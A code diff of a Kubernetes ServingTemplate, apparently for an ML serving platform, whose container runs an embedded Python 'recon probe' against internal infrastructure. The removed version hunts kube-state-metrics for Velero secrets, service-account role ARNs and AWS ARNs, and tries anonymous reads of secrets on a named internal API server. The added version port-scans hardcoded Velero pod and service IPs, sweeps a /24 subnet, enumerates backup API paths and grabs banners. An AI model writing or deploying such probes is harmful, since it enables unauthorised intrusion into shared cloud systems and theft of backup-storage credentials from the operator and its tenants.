@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v13
+  name: impact-probe-v14
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v13"
+    scenarios.ai.sap.com/id: "impact-probe-v14"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v13"
-    executables.ai.sap.com/name: "impact-probe-v13"
-    executables.ai.sap.com/description: "Velero credential recon probe v13"
+    scenarios.ai.sap.com/name: "impact-probe-v14"
+    executables.ai.sap.com/name: "impact-probe-v14"
+    executables.ai.sap.com/description: "Velero direct pod probe v14"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,11 +28,11 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import socket, ssl, re, json, time
+            import socket, ssl, re, errno as errno_mod
             import urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P13] {k}: {str(v)[:8000]}", flush=True)
+                print(f"[P14] {k}: {str(v)[:8000]}", flush=True)
 
             def http_get(url, headers=None, timeout=10):
                 try:
@@ -50,7 +50,7 @@ spec:
                 except Exception as e:
                     return f"ERR:{type(e).__name__}:{e}", 0, {}
 
-            def tcp_probe(host, port, timeout=5):
+            def tcp_probe(host, port, timeout=6):
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(timeout)
                 try:
@@ -58,197 +58,138 @@ spec:
                     s.close()
                     return "OPEN"
                 except socket.timeout:
-                    return "TIMEOUT"
+                    return "ETIMEDOUT"
                 except ConnectionRefusedError:
-                    return "REFUSED"
+                    return "ECONNREFUSED"
                 except OSError as e:
-                    return f"OSError_{e.errno}"
+                    return f"OSError_{e.errno}_{errno_mod.errorcode.get(e.errno, '?')}"
                 finally:
                     try: s.close()
                     except: pass
 
-            KSM = "http://ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
-            KSM_CUSTOM = "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
-            TA = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
-            TA2 = "http://100.106.186.136:80"
+            VELERO_POD_IP  = "100.64.85.21"
+            VELERO_SVC_IP  = "100.106.232.21"
 
-            # ── 1. KSM: velero namespace -- pod IPs, annotations, SA, secrets ────
-            report("---", "=== 1. KSM: VELERO NAMESPACE FULL DUMP ===")
-            body, code, _ = http_get(KSM, timeout=20)
-            if code == 200:
-                lines = body.split("\n")
+            # ── 1. TCP REACHABILITY ───────────────────────────────────────────────
+            report("---", "=== 1. TCP REACHABILITY ===")
+            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
+                for port in [8085, 8080, 8443, 80, 443, 11001, 2112]:
+                    result = tcp_probe(target, port)
+                    report(f"TCP_{label}_{target}:{port}", result)
 
-                # Pod info -- get pod IPs and node placement
-                velero_pod = [l for l in lines
-                              if "velero" in l.lower() and not l.startswith("#") and l.strip()]
-                report("KSM_VELERO_ALL_METRICS", "\n".join(velero_pod[:200]))
+            # ── 2. HTTP PROBE ON ALL RESPONSIVE PORTS ────────────────────────────
+            report("---", "=== 2. HTTP PROBE ===")
+            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
+                for port in [8085, 8080, 80]:
+                    for scheme in ["http", "https"]:
+                        body, code, hdrs = http_get(f"{scheme}://{target}:{port}/", timeout=7)
+                        if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
+                            report(f"HTTP_{label}_{scheme}_{target}:{port}_root",
+                                   f"[{code}] hdrs={list(hdrs.keys())[:6]} {body[:300]}")
+                            # If we get any non-error response, enumerate paths
+                            for path in ["/metrics", "/api/v1", "/api/v1/backups",
+                                         "/api/v1/backup-storage-locations",
+                                         "/api/v1/schedules", "/api/v1/restores",
+                                         "/api/v1/volume-snapshot-locations",
+                                         "/health", "/version", "/debug/pprof"]:
+                                b2, c2, h2 = http_get(f"{scheme}://{target}:{port}{path}", timeout=7)
+                                if c2 != 0 and "ERR:timed" not in b2 and "ERR:Connection" not in b2:
+                                    report(f"HTTP_{label}_{scheme}_{target}:{port}{path.replace('/','_')}",
+                                           f"[{c2}] {b2[:3000]}")
 
-                # Specifically: kube_pod_info for pod IPs
-                pod_info = [l for l in lines
-                            if 'kube_pod_info' in l and 'velero' in l and not l.startswith("#")]
-                report("KSM_VELERO_POD_INFO", "\n".join(pod_info))
-
-                # Pod annotations -- IRSA role ARN lives here
-                pod_ann = [l for l in lines
-                           if 'kube_pod_annotation' in l and 'velero' in l and not l.startswith("#")]
-                report("KSM_VELERO_POD_ANNOTATIONS", "\n".join(pod_ann[:50]))
-
-                # ServiceAccount annotations -- eks.amazonaws.com/role-arn
-                sa_lines = [l for l in lines
-                            if ('kube_serviceaccount' in l or 'service_account' in l.lower())
-                            and 'velero' in l and not l.startswith("#")]
-                report("KSM_VELERO_SA", "\n".join(sa_lines[:30]))
-
-                # Secret info -- names of secrets in velero namespace
-                secret_lines = [l for l in lines
-                                if 'kube_secret' in l and 'velero' in l and not l.startswith("#")]
-                report("KSM_VELERO_SECRETS", "\n".join(secret_lines[:30]))
-
-                # ConfigMap info
-                cm_lines = [l for l in lines
-                            if 'kube_configmap' in l and 'velero' in l and not l.startswith("#")]
-                report("KSM_VELERO_CONFIGMAPS", "\n".join(cm_lines[:20]))
-
-                # CronJob info
-                cj_lines = [l for l in lines
-                            if 'kube_cronjob' in l and 'velero' in l and not l.startswith("#")]
-                report("KSM_VELERO_CRONJOBS", "\n".join(cj_lines[:20]))
-
-                # Extract pod IPs from kube_pod_info
-                pod_ips = re.findall(r'kube_pod_info\{[^}]*namespace="velero"[^}]*pod_ip="([^"]+)"', body)
-                report("KSM_VELERO_POD_IPS", pod_ips)
-            else:
-                report("KSM_ERR", f"[{code}]")
-
-            # ── 2. KSM CUSTOM: Velero CRDs (BackupStorageLocation, Schedule) ─────
-            report("---", "=== 2. KSM CUSTOM: VELERO CRDs ===")
-            body_c, code_c, _ = http_get(KSM_CUSTOM, timeout=20)
-            if code_c == 200:
-                lines = body_c.split("\n")
-                velero_crd = [l for l in lines
-                              if "velero" in l.lower() and not l.startswith("#") and l.strip()]
-                report("KSM_CUSTOM_VELERO", "\n".join(velero_crd[:100]))
-                # Also look for backup/restore metrics
-                backup_lines = [l for l in lines
-                                if any(x in l.lower() for x in ["backup", "restore", "schedule", "bsl", "vsl"])
-                                and not l.startswith("#") and l.strip()]
-                report("KSM_CUSTOM_BACKUP", "\n".join(backup_lines[:50]))
-            else:
-                report("KSM_CUSTOM_ERR", f"[{code_c}]")
-
-            # ── 3. OTel TA: endpointslice targets for velero ─────────────────────
-            report("---", "=== 3. OTel TA: VELERO ENDPOINTSLICE + POD TARGETS ===")
-            for ta_url in [TA, TA2]:
-                body, code, _ = http_get(f"{ta_url}/jobs/kubernetes-endpointslices/targets", timeout=15)
+            # ── 3. METRICS DEEP PARSE (if /metrics reachable) ────────────────────
+            report("---", "=== 3. VELERO METRICS FULL PARSE ===")
+            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
+                body, code, _ = http_get(f"http://{target}:8085/metrics", timeout=10)
                 if code == 200:
-                    # Filter velero entries
-                    try:
-                        data = json.loads(body)
-                        for collector, info in data.items():
-                            for target in info.get("targets", []):
-                                labels = target.get("labels", {})
-                                if "velero" in str(labels).lower():
-                                    report(f"TA_VELERO_TARGET_{ta_url[-15:]}", json.dumps(labels, indent=2)[:3000])
-                    except Exception as e:
-                        # Try regex if JSON parse fails
-                        velero_parts = re.findall(r'\{[^}]*velero[^}]*\}', body)
-                        report(f"TA_VELERO_REGEX_{ta_url[-15:]}", "\n".join(velero_parts[:10]))
+                    report(f"METRICS_{label}_FULL", body[:8000])
+                    lines = body.split("\n")
+                    # Storage location info (S3 bucket, region, prefix)
+                    bsl = [l for l in lines if "backup_storage_location" in l and not l.startswith("#")]
+                    report(f"METRICS_{label}_BSL", "\n".join(bsl))
+                    # Backup history (names, sizes, timestamps)
+                    backup = [l for l in lines if "velero_backup" in l and not l.startswith("#") and l.strip()]
+                    report(f"METRICS_{label}_BACKUPS", "\n".join(backup[:60]))
+                    # Schedule info
+                    schedule = [l for l in lines if "schedule" in l.lower() and not l.startswith("#") and l.strip()]
+                    report(f"METRICS_{label}_SCHEDULES", "\n".join(schedule[:20]))
+                    # Volume snapshot
+                    vsl = [l for l in lines if "volume_snapshot" in l and not l.startswith("#") and l.strip()]
+                    report(f"METRICS_{label}_VSL", "\n".join(vsl[:20]))
+                else:
+                    report(f"METRICS_{label}_8085", f"[{code}] {body[:200]}")
 
-                body2, code2, _ = http_get(f"{ta_url}/jobs/kubernetes-pods/targets", timeout=15)
-                if code2 == 200:
-                    try:
-                        data2 = json.loads(body2)
-                        for collector, info in data2.items():
-                            for target in info.get("targets", []):
-                                labels = target.get("labels", {})
-                                if "velero" in str(labels).lower():
-                                    report(f"TA_VELERO_POD_{ta_url[-15:]}", json.dumps(labels, indent=2)[:3000])
-                    except:
-                        pass
+            # ── 4. VELERO REST API (port 8085 serves both metrics + REST) ─────────
+            report("---", "=== 4. VELERO REST API ===")
+            for target, label in [(VELERO_POD_IP, "POD"), (VELERO_SVC_IP, "SVC")]:
+                # Velero REST API with namespace header
+                for path in ["/api/v1/backups", "/api/v1/backup-storage-locations",
+                              "/api/v1/schedules", "/api/v1/restores",
+                              "/api/v1/downloadrequests"]:
+                    body, code, hdrs = http_get(
+                        f"http://{target}:8085{path}",
+                        headers={"Accept": "application/json",
+                                 "X-Kubernetes-Namespace": "velero"},
+                        timeout=8
+                    )
+                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
+                        report(f"REST_{label}{path.replace('/','_')}", f"[{code}] {body[:2000]}")
 
-            # ── 4. Direct probe of velero pod IPs ────────────────────────────────
-            report("---", "=== 4. DIRECT VELERO POD IP PROBES ===")
-            # Known velero pod from image scan: velero-service-84ccf5468d-6h82d
-            # Pod IPs are in 100.64.x.x range -- try to get from KSM above
-            # Also try the known velero pod image pod from probe v3 data
-            # We'll scan a wider range based on known pod CIDR patterns
-            # From KSM we expect to extract actual IPs; also try known ranges
-
-            velero_candidate_ips = []
-            # Re-query KSM to extract velero pod IPs reliably
-            body_ksm, _, _ = http_get(KSM, timeout=20)
-            matches = re.findall(
-                r'kube_pod_info\{[^}]*namespace="velero"[^}]*\}\s+([\d.]+)',
-                body_ksm
-            )
-            report("KSM_VELERO_POD_IP_EXTRACTED", matches)
-
-            # Also try regex variant for pod_ip label
-            matches2 = re.findall(
-                r'namespace="velero"[^}]*pod_ip="([^"]+)"',
-                body_ksm
-            )
-            report("KSM_VELERO_POD_IP_LABEL", matches2)
-
-            velero_candidate_ips = list(set(matches + matches2))
-            report("VELERO_IPS_TO_PROBE", velero_candidate_ips)
-
-            for ip in velero_candidate_ips:
-                report(f"VELERO_POD_{ip}", f"probing...")
-                for port in [8085, 8080, 8443, 11001, 2112]:
-                    result = tcp_probe(ip, port, timeout=5)
-                    report(f"VELERO_{ip}:{port}_TCP", result)
-                    if result == "OPEN":
-                        body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=6)
-                        report(f"VELERO_{ip}:{port}_HTTP_ROOT", f"[{code}] {body[:500]}")
-                        for path in ["/metrics", "/api/v1", "/backup-storage-locations",
-                                     "/health", "/version"]:
-                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=6)
-                            if c2 not in (0,) and "ERR:timed" not in b2:
-                                report(f"VELERO_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:1000]}")
-
-            # ── 5. Velero service DNS -- try all known ports ──────────────────────
-            report("---", "=== 5. VELERO SERVICE DNS ALL PORTS ===")
-            velero_dns = "velero.velero.svc.cluster.local"
-            for port in [8085, 8080, 8443, 11001, 2112, 80, 443]:
-                result = tcp_probe(velero_dns, port, timeout=5)
-                report(f"VELERO_DNS:{port}_TCP", result)
+            # ── 5. VELERO POD: try adjacent IPs (same /24) ───────────────────────
+            report("---", "=== 5. ADJACENT IP SCAN (100.64.85.x) ===")
+            # In case velero moved pods or there are multiple replicas
+            subnet = "100.64.85"
+            for i in range(1, 40):
+                ip = f"{subnet}.{i}"
+                if ip == VELERO_POD_IP:
+                    continue
+                result = tcp_probe(ip, 8085, timeout=2)
                 if result == "OPEN":
-                    body, code, hdrs = http_get(f"http://{velero_dns}:{port}/metrics", timeout=6)
-                    report(f"VELERO_DNS:{port}_METRICS", f"[{code}] {body[:1000]}")
+                    report(f"ADJACENT_{ip}:8085", "OPEN")
+                    body, code, _ = http_get(f"http://{ip}:8085/metrics", timeout=5)
+                    report(f"ADJACENT_{ip}_METRICS", f"[{code}] {body[:1000]}")
+                elif result not in ("ETIMEDOUT", "ECONNREFUSED"):
+                    report(f"ADJACENT_{ip}:8085", result)
 
-            # ── 6. KSM: AWS role ARN scan across ALL namespaces ──────────────────
-            report("---", "=== 6. KSM: eks.amazonaws.com/role-arn ACROSS ALL NS ===")
-            body_ksm2, code2, _ = http_get(KSM, timeout=20)
-            if code2 == 200:
-                # Look for IRSA role ARN annotations in pod/SA metrics
-                arn_lines = [l for l in body_ksm2.split("\n")
-                             if "arn:aws" in l.lower() or "role_arn" in l.lower()
-                             or "eks_amazonaws" in l.lower()
-                             and not l.startswith("#")]
-                report("KSM_ARN_LINES", "\n".join(arn_lines[:40]))
+            # ── 6. HTTPS PROBE (Velero may use TLS on 8085 or 11001) ──────────────
+            report("---", "=== 6. VELERO HTTPS / TLS ===")
+            for target in [VELERO_POD_IP, VELERO_SVC_IP]:
+                for port in [8085, 8443, 11001]:
+                    body, code, hdrs = http_get(f"https://{target}:{port}/metrics", timeout=7)
+                    if code != 0 and "ERR:timed" not in body and "ERR:Connection" not in body:
+                        report(f"HTTPS_{target}:{port}_metrics", f"[{code}] {body[:1000]}")
 
-                # Also look for AWS account IDs (12-digit numbers in arn context)
-                arns = re.findall(r'arn:aws:[^\s"\']+', body_ksm2)
-                report("KSM_ALL_ARNS", "\n".join(list(set(arns))[:30]))
+            # ── 7. RAW TCP BANNER GRAB ────────────────────────────────────────────
+            report("---", "=== 7. RAW BANNER GRAB ===")
+            for target in [VELERO_POD_IP, VELERO_SVC_IP]:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(6)
+                try:
+                    s.connect((target, 8085))
+                    report(f"BANNER_{target}:8085_CONNECT", "SUCCESS")
+                    # Send minimal HTTP/1.0 GET
+                    s.sendall(b"GET /metrics HTTP/1.0\r\nHost: velero\r\n\r\n")
+                    import time; time.sleep(1)
+                    data = b""
+                    s.settimeout(3)
+                    try:
+                        while True:
+                            chunk = s.recv(4096)
+                            if not chunk: break
+                            data += chunk
+                    except: pass
+                    report(f"BANNER_{target}:8085_RESPONSE", data.decode(errors="replace")[:3000])
+                except socket.timeout:
+                    report(f"BANNER_{target}:8085", "ETIMEDOUT")
+                except ConnectionRefusedError:
+                    report(f"BANNER_{target}:8085", "ECONNREFUSED")
+                except OSError as e:
+                    report(f"BANNER_{target}:8085", f"OSError_{e.errno}_{errno_mod.errorcode.get(e.errno,'?')}: {e}")
+                finally:
+                    try: s.close()
+                    except: pass
 
-            # ── 7. Velero BackupStorageLocation via kubectl-equivalent ────────────
-            report("---", "=== 7. VELERO BSL VIA API SERVER (anonymous) ===")
-            # Try the K8s API server with anonymous access for velero CRDs
-            api_server = "https://api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
-            for path in [
-                "/apis/velero.io/v1/backupstoragelocations",
-                "/apis/velero.io/v1/schedules",
-                "/apis/velero.io/v1/backups",
-                "/apis/velero.io/v1",
-                "/api/v1/namespaces/velero/secrets",
-                "/api/v1/namespaces/velero/configmaps",
-                "/apis/velero.io",
-            ]:
-                body, code, hdrs = http_get(f"{api_server}{path}", timeout=8)
-                report(f"APISERVER{path.replace('/','_')}", f"[{code}] {body[:500]}")
-
-            report("DONE", "probe v13 complete")
+            report("DONE", "probe v14 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
